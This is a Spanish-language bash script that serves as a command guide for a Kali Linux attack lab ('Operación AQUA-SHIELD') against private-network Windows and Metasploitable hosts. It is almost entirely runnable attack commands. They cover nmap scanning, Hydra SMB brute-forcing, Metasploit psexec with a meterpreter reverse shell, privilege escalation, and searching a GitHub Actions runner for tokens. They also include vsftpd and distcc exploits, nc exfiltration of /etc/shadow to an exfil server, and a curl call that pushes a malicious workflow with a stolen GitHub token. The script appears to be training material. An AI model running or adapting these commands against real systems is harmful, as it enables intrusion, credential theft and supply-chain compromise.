#!/bin/bash
# kali-attack.sh - Guía de comandos para el ataque desde Kali Linux
# Laboratorio: Operación AQUA-SHIELD

TARGET_WIN="192.168.56.102"
TARGET_METASPLOITABLE="192.168.56.103"
EXFIL_SERVER="192.168.56.101"

echo "=== FASE 1: RECONOCIMIENTO ==="
nmap -sn 192.168.56.0/24
nmap -sV -sC -O --top-ports 1000 $TARGET_WIN $TARGET_METASPLOITABLE

echo "=== FASE 2: EXPLOTACIÓN SMB (Vuln #1) ==="
# Opción A: Hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://$TARGET_WIN

# Opción B: Metasploit psexec
msfconsole -q -x "
use exploit/windows/smb/psexec
set RHOSTS $TARGET_WIN
set SMBUSER administrator
set SMBPASS Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $EXFIL_SERVER
exploit
"

echo "=== FASE 3: ESCALADA DE PRIVILEGIOS (Vuln #2 - Unquoted Service Path) ==="
# Dentro de Meterpreter:
# bg
# use exploit/windows/local/trusted_service_path
# set SESSION 1
# set LHOST $EXFIL_SERVER
# exploit

echo "=== FASE 4: ROBO DE SECRETOS (Simulando el caso Trivy) ==="
# En shell de Windows (como SYSTEM):
# Get-ChildItem Env: | Where-Object { $_.Name -match "GITHUB|DOCKER|AWS|SECRET|TOKEN" }
# Get-Content C:\\actions-runner\\.runner
# Get-ChildItem C:\\actions-runner\\_diag\\*.log | Select-String -Pattern "token|secret"

echo "=== FASE 5: EXPLOTACIÓN METASPLOITABLE (Vuln #4 y #5) ==="
# vsftpd backdoor
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST $TARGET_METASPLOITABLE
exploit
"

# distcc
msfconsole -q -x "
use exploit/unix/misc/distcc_exec
set RHOST $TARGET_METASPLOITABLE
exploit
"

echo "=== FASE 6: EXFILTRACIÓN ==="
# En Metasploitable:
# tar czf /tmp/secrets.tar.gz /etc/shadow /var/log
# nc $EXFIL_SERVER 4444 < /tmp/secrets.tar.gz

# En Kali:
# nc -lvnp 4444 > stolen_data.tar.gz

echo "=== FASE 7: INYECCIÓN DE WORKFLOW (Supply Chain) ==="
# Con el token GITHUB_TOKEN robado:
# export GITHUB_TOKEN="ghp_xxxxxxxxxxxx"
# curl -X PUT -H "Authorization: token $GITHUB_TOKEN" \
#   -H "Accept: application/vnd.github.v3+json" \
#   "https://api.github.com/repos/TU_USUARIO/trivy-demo-lab/contents/.github/workflows/infected.yml" \
#   -d '{"message":"fix: update build","content":"BASE64_CONTENT"}'

echo "=== LISTO ==="
